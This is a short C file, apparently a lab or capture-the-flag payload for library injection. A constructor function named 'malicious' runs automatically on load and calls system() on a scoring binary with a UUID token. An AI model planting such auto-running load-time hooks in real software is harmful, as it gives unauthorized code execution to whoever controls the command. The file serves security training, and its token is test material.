#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a18e6f3c-aaf3-4729-ae4a-6523247d03cf");
}
